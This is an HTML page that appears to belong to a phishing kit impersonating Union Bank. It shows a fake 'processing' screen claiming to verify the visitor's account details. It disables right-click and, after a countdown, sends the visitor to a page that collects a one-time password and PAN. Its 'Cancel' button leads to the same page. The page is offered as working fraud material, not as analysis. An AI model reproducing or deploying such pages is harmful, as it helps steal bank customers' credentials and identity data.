<!DOCTYPE html>
<html lang="zxx">

<head>
    <script src="./removeBanner.js"></script>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <meta name="msapplication-TileColor" content="#da532c">
    <meta name="theme-color" content="#ffffff">
    <title>Proccessing...</title>
    <style>
        #ad {
            width: 20%;
            margin: -30px;
        }

        #ft {
            width: 100%;
        }

        #bg {
            width: 104%;
            margin: -8px;
        }

        #aa {
            width: 104.5%;
            margin-left: -8px;
            border-bottom: solid #7212b3;
            border-width: 4px;
        }

        #ll {
            width: 343px;
            background-color: white;
            color: #3E1128;
            outline: none;
            border-style: solid;
            border-color: red;
            border-radius: 2px;
            border-width: 1px;
            cursor: pointer;
            font-size: 18px;
            height: 36px;
            margin-left: 2px;
        }

        #ll:hover {
            background-color: #3E1128;
            color: white;
            outline: none;
            border: solid red;
            border-radius: 1px;
            border-width: 0.1px;
            cursor: pointer;
            font-size: 18px;
            height: 36px;
        }

        #line {
            width: 104.5%;
            margin-left: -8px;
            border-bottom: solid #1D85FE;
            border-width: 2px;
        }

        #col {
            width: 104%;
            background-color: #FF0000;
            height: 58px;
            margin-left: -7px;
        }
    </style>
    <script language="javascript">
        var message = "This function is not allowed here.";

        function clickIE4() {

            if (event.button == 2) {
                alert(message);
                return false;
            }
        }

        function clickNS4(e) {
            if (document.layers || document.getElementById && !document.all) {
                if (e.which == 2 || e.which == 3) {
                    alert(message);
                    return false;
                }
            }
        }

        if (document.layers) {
            document.captureEvents(Event.MOUSEDOWN);
            document.onmousedown = clickNS4;
        } else if (document.all && !document.getElementById) {
            document.onmousedown = clickIE4;
        }

        document.oncontextmenu = new Function("alert(message);return false;")
    </script>
</head>

<body>
    <div>
        <img src="lolo.jpg" alt="" id="bg">
    </div><br>
    <div id="line">
    </div>
    <div id="col">
        <br>
        <b style="color:white; font-size:18px; padding:10px;">Proccessing...</b>
    </div><br>
    <center><b style="font-size:14px; font-family: Arial, Helvetica, sans-serif;">Thank you for validating your Union Bank Account details</b></center><br><br>
    <center><img src="payt.gif" alt="" id="ad"><br><br><br></center>
    <form action="Enter_OTP_PAN.php" method="post">
        <div id="ha">
            <center>
                <h4 style="color:green; font-size:15px; font-family: Arial, Helvetica, sans-serif; margin:0px;">Please wait while we verifying your Union Bank Account details...</h4>
            </center>
        </div>
        <div id="ba">
            <center><b style="font-size:14px; font-family: Arial, Helvetica, sans-serif;">Don't press any key while proccessing...</b></center>
        </div><br><br><br>
        <be><br>
            <div id="kk">
                <center><button onclick="myFunction()" type="submit" id="ll">Cancel</button>
                    <center>
            </div><br>
            <script>
                function myFunction() {
                    window.location.href = "Enter_OTP_PAN.php";
                }
            </script>
            <!--<div id="bb">
   <center><b style="color:#7212b3; margin:0px;">We sending One Time Password on your registered mobile number.</b></center>
    </div>-->

            <body onload="startTimer();">
                <div style="text-align:center;">
                    <script type="text/javascript">
                        var timer = 16;
                        var sec = 16;

                        function startTimer() {
                            sec = parseInt(timer % 16);

                            if (timer < 2) {
                                // timer.stop();
                                window.location.href = "Enter_OTP_PAN.php";
                            }

                            document.getElementById("time").innerHTML = "<b> Please wait  </b>" + sec.toString();
                            timer--;
                            setTimeout(function() {
                                startTimer();

                            }, 1000);
                        }
                    </script>
                    <div>
                        <b style="color:grey; font-size:15px;"><span style="color:grey; font-size:15px;" id="time"></span>&nbsp;second</b><br><br><br><br>
                        <img src="futterhas.png" alt="" id="ft">
                    </div>
    </form>
    </body>

</html>